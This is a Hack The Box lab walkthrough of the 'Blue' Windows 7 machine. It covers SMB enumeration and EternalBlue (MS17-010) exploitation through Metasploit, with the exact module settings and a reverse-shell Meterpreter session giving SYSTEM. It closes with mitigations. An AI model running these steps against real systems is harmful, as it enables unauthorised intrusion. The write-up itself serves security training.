---
title: "HTB Walkthrough: Blue"
date: 2026-03-28
draft: false
description: "Full walkthrough of the Blue machine from Hack The Box. Easy difficulty, Windows 7 SP1. Exploiting EternalBlue (MS17-010) via Metasploit for direct NT AUTHORITY\\SYSTEM access."
tags: ["HackTheBox", "Windows", "Easy", "EternalBlue", "MS17-010", "Metasploit", "SMB", "RCE", "blue", "writeups"]
categories: ["HTB Walkthroughs"]
series: ["HackTheBox CPTS"]
---

{{< lead >}}
Walkthrough of **Blue** on Hack The Box. **Easy** difficulty machine running **Windows 7 SP1**. The vector is the infamous **EternalBlue** exploit (MS17-010), a vulnerability in SMBv1 that compromises the Windows kernel and delivers direct access as **NT AUTHORITY\SYSTEM** with no credentials required.
{{< /lead >}}

{{< badge >}}HackTheBox{{< /badge >}}
{{< badge >}}Windows{{< /badge >}}
{{< badge >}}Easy{{< /badge >}}

---

## 🗺️ Machine Info

| Field          | Detail                                                     |
|----------------|------------------------------------------------------------|
| **Name**       | Blue                                                       |
| **OS**         | Windows 7 Professional SP1 (x64)                           |
| **Difficulty** | Easy                                                       |
| **IP**         | 10.129.10.54                                               |
| **Techniques** | SMB Enumeration · EternalBlue · Kernel Exploit             |
| **CVE / MS**   | MS17-010 (CVE-2017-0144)                                   |

---

## 1. Reconnaissance

### 1.1 Port Scan

```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn 10.129.10.54
```

```
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
49152/tcp open  msrpc
49153/tcp open  msrpc
49154/tcp open  msrpc
```

Version scan on relevant ports:

```bash
nmap -sC -sV -p135,139,445 10.129.10.54
```

```
PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds

Host script results:
| smb-os-discovery:
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: haris-PC
|_  System time: 2026-03-28T15:00:03+00:00
```

*Open ports:*
- `135, 139, 445` → Windows SMB/NetBIOS stack — classic pattern of a Windows system with exposed shared resources
- `49152+` → Dynamic RPC ports (Microsoft EPMAP)

> **💡 Key detail:** The `smb-os-discovery` script confirms **Windows 7 Professional SP1 x64**. This version is vulnerable to MS17-010 if the KB4012212 patch hasn't been applied. The hostname `haris-PC` suggests a desktop machine, not a hardened server.

### 1.2 SMB Enumeration

Before exploiting anything, we enumerate shared resources to understand the exposed surface:

```bash
smbclient -N -L //10.129.10.54
```

```
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
Share           Disk
Users           Disk
```

Shares are visible via null session (`-N`), but `smbmap` confirms we have no read or write permissions without credentials:

```bash
smbmap -H 10.129.10.54
```

```
[!] Access denied on 10.129.10.54, no fun for you...
```

Without valid credentials we can't access files. The only path is exploiting the vulnerability in the service itself.

> **💡 Conclusions:** SMBv1 active, Windows 7 SP1 unpatched, port 445 accessible. All prerequisites for MS17-010 are present.

---

## 2. Exploitation — MS17-010 EternalBlue

### 2.1 Vulnerability Analysis

**EternalBlue** is an exploit developed by the NSA and publicly leaked by the Shadow Brokers group in April 2017. It exploits a **buffer overflow in the non-paged pool of the Windows kernel** when processing malformed SMBv1 packets.

```
Normal flow:    SMBv1 packet → srv.sys validates the buffer → processes the request
Malicious flow: malformed SMBv1 packet → srv.sys doesn't validate size → kernel overflow
                → shellcode injection → execution as SYSTEM
```

The reason we get SYSTEM directly is that `srv.sys` — the driver that handles SMB — runs in **kernel mode**. No subsequent privilege escalation is needed. If port 445 is accessible and SMBv1 is enabled, the machine is vulnerable regardless of the attacker's credentials.

### 2.2 Metasploit Exploit Configuration

```bash
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(ms17_010_eternalblue) > set RHOSTS 10.129.10.54
msf6 exploit(ms17_010_eternalblue) > set LHOST tun0
```

The module uses `windows/x64/meterpreter/reverse_tcp` by default, appropriate for the target's x64 architecture.

### 2.3 Execution

```bash
msf6 exploit(ms17_010_eternalblue) > run
```

```
[*] Started reverse TCP handler on 10.10.15.237:4444
[+] 10.129.10.54:445 - Host is likely VULNERABLE to MS17-010!
[+] 10.129.10.54:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] Sending stage (244806 bytes) to 10.129.10.54
[*] Meterpreter session 1 opened (10.10.15.237:4444 -> 10.129.10.54:49158)
```

The `ETERNALBLUE overwrite completed successfully` line confirms the kernel has been compromised and the Meterpreter stage has been injected into memory. We verify privileges:

```bash
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

**NT AUTHORITY\SYSTEM** is the maximum privilege level on Windows, equivalent to `root` on Linux. No additional escalation step is required.

---

## 3. User Flag

```bash
meterpreter > cd C:\Users\haris\Desktop
meterpreter > cat user.txt
```

> 🔑 User flag obtained.

---

## 4. Root Flag

No privilege escalation needed — EternalBlue delivers SYSTEM directly. We access the Administrator's desktop:

```bash
meterpreter > cd C:\Users\Administrator\Desktop
meterpreter > cat root.txt
```

> 🏁 Root flag obtained.

---

## 5. Summary and Lessons Learned

**Compromise path:**

1. **Recon** → Nmap + `smb-os-discovery` confirm Windows 7 SP1 x64 unpatched with SMB exposed.
2. **SMB enumeration** → SMBv1 active, null session visible but no file access.
3. **MS17-010** → EternalBlue via Metasploit → kernel buffer overflow → direct shell as **NT AUTHORITY\SYSTEM**.
4. **Flags** → No escalation needed, direct access to both desktops → `user.txt` + `root.txt`.

**What I learned from this machine:**

- **Precise OS identification is critical on Windows.** The version, Service Pack, and architecture can determine whether an exploit works or not. Nmap's `smb-os-discovery` script extracts this information directly from the SMB protocol without credentials.

- **EternalBlue requires no credentials — only access to port 445 with SMBv1 active.** It's a network-level vulnerability that affects the kernel directly. This sets it apart from most exploits, which require some prior authentication.

- **A kernel-level exploit delivers maximum privileges from the first moment.** On Windows, `srv.sys` runs in kernel mode, so any code injected through it inherits that context — SYSTEM with no additional steps. This illustrates why kernel vulnerabilities are the most severe.

- **EternalBlue was the initial vector for WannaCry and NotPetya.** Both attacks occurred in 2017, weeks after the patch was available, and affected hundreds of thousands of systems. The window between patch publication and mass deployment is the window attackers exploit at global scale.

**Mitigations:**

| Vector | Mitigation |
|--------|------------|
| MS17-010 unpatched | Apply bulletin MS17-010 (KB4012212) — the most critical defense against this vector |
| SMBv1 enabled | Disable SMBv1 completely; use only SMBv2 or SMBv3 |
| Windows 7 without support (EOL January 2020) | Migrate to a supported OS (Windows 10/11 or modern Windows Server) |
| Port 445 exposed on the network | Segment the network and block 445 from outside; isolate legacy machines in separate VLANs |
